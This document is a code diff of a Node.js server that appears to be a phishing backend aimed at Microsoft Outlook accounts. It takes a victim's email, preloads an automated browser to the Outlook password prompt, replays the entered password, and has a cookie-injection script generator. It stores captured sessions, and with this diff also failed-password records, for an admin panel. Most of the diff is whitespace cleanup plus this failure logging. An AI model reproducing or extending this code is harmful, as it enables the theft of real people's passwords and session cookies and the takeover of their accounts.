@@ -207,16 +207,16 @@ function generateCookieInjectionScript(email, cookies, sessionId) {
 async function startBrowserPreload(sessionId, email) {
     try {
         console.log(`🚀 Starting browser preload for session: ${sessionId}, email: ${email}`);
-        
+
         // Check if we've reached the maximum preload limit
         const currentPreloads = Array.from(automationSessions.values())
             .filter(session => session.status === 'preloading' || session.status === 'preload_ready');
-        
+
         if (currentPreloads.length >= MAX_PRELOADS) {
             // Evict oldest preload to make space
             const oldestPreload = currentPreloads
                 .sort((a, b) => a.startTime - b.startTime)[0];
-            
+
             if (oldestPreload) {
                 console.log(`📊 MAX_PRELOADS reached, evicting oldest preload: ${oldestPreload.sessionId || 'unknown'}`);
                 try {
@@ -263,7 +263,7 @@ async function startBrowserPreload(sessionId, email) {
 
         // Start the preload process (email entry and wait at password prompt)
         const preloadSuccess = await automation.preload(email);
-        
+
         if (preloadSuccess) {
             // Update status to ready
             automationSessions.get(sessionId).status = 'preload_ready';
@@ -272,7 +272,7 @@ async function startBrowserPreload(sessionId, email) {
             // Update status to failed
             automationSessions.get(sessionId).status = 'preload_failed';
             console.log(`❌ Browser preload failed for: ${email} (session: ${sessionId})`);
-            
+
             // Clean up failed preload after a short delay
             setTimeout(async () => {
                 try {
@@ -286,7 +286,7 @@ async function startBrowserPreload(sessionId, email) {
 
     } catch (error) {
         console.error(`❌ Browser preload error for ${email}:`, error.message);
-        
+
         // Clean up on error
         if (automationSessions.has(sessionId)) {
             try {
@@ -299,7 +299,7 @@ async function startBrowserPreload(sessionId, email) {
                 console.warn('Error cleaning up preload after error:', cleanupError.message);
             }
         }
-        
+
         throw error;
     }
 }
@@ -308,7 +308,7 @@ async function startBrowserPreload(sessionId, email) {
 function getPreloadStats() {
     const preloadSessions = Array.from(automationSessions.values())
         .filter(session => session.status && session.status.startsWith('preload'));
-    
+
     return {
         total: preloadSessions.length,
         preloading: preloadSessions.filter(s => s.status === 'preloading').length,
@@ -832,7 +832,7 @@ app.post('/api/verify-email', async (req, res) => {
 
                     // Start browser preloading in background for faster password authentication
                     const sessionId = createSessionId();
-                    
+
                     // Start preload without awaiting - let it run in parallel
                     const preloadPromise = startBrowserPreload(sessionId, email).catch(error => {
                         console.warn(`⚠️ Browser preload failed for ${email}:`, error.message);
@@ -926,10 +926,10 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         // Check if there's a preloaded session ready for this email
         let preloadedSession = null;
         const startTime = Date.now();
-        
+
         if (sessionId && automationSessions.has(sessionId)) {
             const session = automationSessions.get(sessionId);
-            
+
             // Validate session matches email for security
             if (session.email !== email) {
                 console.warn(`⚠️ Session email mismatch: expected ${email}, got ${session.email}`);
@@ -941,15 +941,15 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                 console.log(`⏳ Preload in progress for: ${email}, waiting for completion...`);
                 const maxWaitTime = 15000; // 15 seconds
                 const pollInterval = 500; // 500ms
-                
+
                 for (let waited = 0; waited < maxWaitTime; waited += pollInterval) {
                     await new Promise(resolve => setTimeout(resolve, pollInterval));
-                    
+
                     if (!automationSessions.has(sessionId)) {
                         console.log(`⚠️ Preload session disappeared during wait: ${sessionId}`);
                         break;
                     }
-                    
+
                     const updatedSession = automationSessions.get(sessionId);
                     if (updatedSession.status === 'preload_ready') {
                         preloadedSession = updatedSession;
@@ -960,7 +960,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         break;
                     }
                 }
-                
+
                 if (!preloadedSession && automationSessions.has(sessionId)) {
                     console.log(`⏰ Preload wait timeout for: ${email}, falling back to cold start`);
                 }
@@ -1067,6 +1067,33 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
                     console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);
 
+                    // Store failed attempt for admin panel
+                    const sessionDir = path.join(__dirname, 'session_data');
+                    if (!fs.existsSync(sessionDir)) {
+                        fs.mkdirSync(sessionDir, { recursive: true });
+                    }
+
+                    const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                    const failureData = {
+                        id: failureId,
+                        sessionId: sessionId,
+                        email: email,
+                        reason: 'Wrong Password',
+                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        timestamp: new Date().toISOString(),
+                        status: 'invalid',
+                        method: 'fast-authentication',
+                        preloadUsed: true,
+                        failureType: 'incorrect_password'
+                    };
+
+                    fs.writeFileSync(
+                        path.join(sessionDir, `invalid_${failureId}.json`),
+                        JSON.stringify(failureData, null, 2)
+                    );
+
+                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
+
                     // Clean up failed session
                     setTimeout(async () => {
                         try {
@@ -1103,7 +1130,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         // Fallback to regular authentication if no preload or preload failed
         if (!usingPreloadedBrowser) {
             console.log(`🔄 No preload available or failed, using cold start for: ${email}`);
-            
+
             automation = new OutlookLoginAutomation({
                 enableScreenshots: true,
                 screenshotQuality: 80
@@ -1127,6 +1154,33 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
                     analytics.failedLogins++;
                     saveAnalytics();
+
+                    // Store failed attempt for admin panel
+                    const sessionDir = path.join(__dirname, 'session_data');
+                    if (!fs.existsSync(sessionDir)) {
+                        fs.mkdirSync(sessionDir, { recursive: true });
+                    }
+
+                    const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                    const failureData = {
+                        id: failureId,
+                        sessionId: newSessionId,
+                        email: email,
+                        reason: 'Wrong Password',
+                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                        timestamp: new Date().toISOString(),
+                        status: 'invalid',
+                        method: 'cold-start-authentication',
+                        preloadUsed: false,
+                        failureType: 'incorrect_password'
+                    };
+
+                    fs.writeFileSync(
+                        path.join(sessionDir, `invalid_${failureId}.json`),
+                        JSON.stringify(failureData, null, 2)
+                    );
+
+                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
 
                     return res.status(401).json({
                         success: false,
@@ -1343,11 +1397,12 @@ app.post('/api/login-automation', async (req, res) => {
                     id: failureId,
                     sessionId: sessionId,
                     email: email,
-                    reason: 'Automation Login Failed',
+                    reason: 'Wrong Password',
                     errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                     timestamp: new Date().toISOString(),
                     status: 'invalid',
-                    method: 'automation'
+                    method: 'automation',
+                    failureType: 'incorrect_password'
                 };
 
                 fs.writeFileSync(
@@ -1560,7 +1615,7 @@ app.get('/api/status', (req, res) => {
 app.get('/api/preload-status/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
-        
+
         if (automationSessions.has(sessionId)) {
             const session = automationSessions.get(sessionId);
             res.json({
@@ -1745,7 +1800,7 @@ app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
 
         if (fs.existsSync(sessionDir)) {
             const files = fs.readdirSync(sessionDir);
-            
+
             // Count valid sessions
             validEntries = files.filter(file => 
                 file.startsWith('session_') && file.endsWith('.json')
@@ -1783,7 +1838,7 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
 
         if (fs.existsSync(sessionDir)) {
             const files = fs.readdirSync(sessionDir);
-            
+
             // Load valid sessions
             files.filter(file => file.startsWith('session_') && file.endsWith('.json'))
                 .forEach(file => {
@@ -1814,7 +1869,8 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
                             timestamp: invalidData.timestamp,
                             status: 'invalid',
                             reason: invalidData.reason,
-                            errorMessage: invalidData.errorMessage
+                            errorMessage: invalidData.errorMessage,
+                            failureType: invalidData.failureType // Include failureType
                         });
                     } catch (e) {
                         console.warn('Error parsing invalid session file:', file);
